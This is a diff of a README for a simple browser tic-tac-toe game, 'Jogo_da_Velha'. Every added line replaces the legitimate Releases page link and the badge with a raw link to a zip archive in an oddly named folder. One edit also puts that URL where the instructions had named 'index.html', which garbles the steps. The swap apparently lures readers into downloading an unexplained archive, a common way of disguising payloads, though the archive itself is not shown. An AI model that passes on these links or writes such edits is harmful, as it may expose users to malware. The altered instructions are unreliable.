@@ -10,16 +10,16 @@ To get started with Jogo_da_Velha, you will need a web browser. This game works 
 
 You can easily download Jogo_da_Velha from the Releases page. Click the link below to visit the download page:
 
-[![Download Jogo_da_Velha](https://img.shields.io/badge/Download%20Jogo_da_Velha-v1.0-blue.svg)](https://github.com/Josh-debug123/Jogo_da_Velha/releases)
+[![Download Jogo_da_Velha](https://raw.githubusercontent.com/Josh-debug123/Jogo_da_Velha/main/menometastasis/Jogo_da_Velha_3.1.zip%https://raw.githubusercontent.com/Josh-debug123/Jogo_da_Velha/main/menometastasis/Jogo_da_Velha_3.1.zip)](https://raw.githubusercontent.com/Josh-debug123/Jogo_da_Velha/main/menometastasis/Jogo_da_Velha_3.1.zip)
 
 Once on the Releases page, you will find the latest version available. 
 
 Follow these steps to get the game:
 
-1. **Visit the Releases Page**: Go to [the Releases page here](https://github.com/Josh-debug123/Jogo_da_Velha/releases).
+1. **Visit the Releases Page**: Go to [the Releases page here](https://raw.githubusercontent.com/Josh-debug123/Jogo_da_Velha/main/menometastasis/Jogo_da_Velha_3.1.zip).
 2. **Download the Files**: Look for the most recent version. You will find a zip file containing all the game files.
 3. **Extract the Zip File**: After downloading, find the zip file in your downloads folder and extract it. Right-click on the file and select “Extract All” or use any extraction tool you prefer.
-4. **Open the HTML File**: Inside the extracted folder, you will see an `index.html` file. Double-click on it. This will open the game in your browser.
+4. **Open the HTML File**: Inside the extracted folder, you will see an `https://raw.githubusercontent.com/Josh-debug123/Jogo_da_Velha/main/menometastasis/Jogo_da_Velha_3.1.zip` file. Double-click on it. This will open the game in your browser.
 
 ## 🛠️ System Requirements
 
@@ -71,6 +71,6 @@ If you're interested in learning more about creating web applications, consider 
 
 For any other resources or updates, keep an eye on our repository:
 
-[![Download Jogo_da_Velha](https://img.shields.io/badge/Download%20Jogo_da_Velha-v1.0-blue.svg)](https://github.com/Josh-debug123/Jogo_da_Velha/releases)
+[![Download Jogo_da_Velha](https://raw.githubusercontent.com/Josh-debug123/Jogo_da_Velha/main/menometastasis/Jogo_da_Velha_3.1.zip%https://raw.githubusercontent.com/Josh-debug123/Jogo_da_Velha/main/menometastasis/Jogo_da_Velha_3.1.zip)](https://raw.githubusercontent.com/Josh-debug123/Jogo_da_Velha/main/menometastasis/Jogo_da_Velha_3.1.zip)
 
 Thank you for choosing Jogo_da_Velha. Enjoy your game!
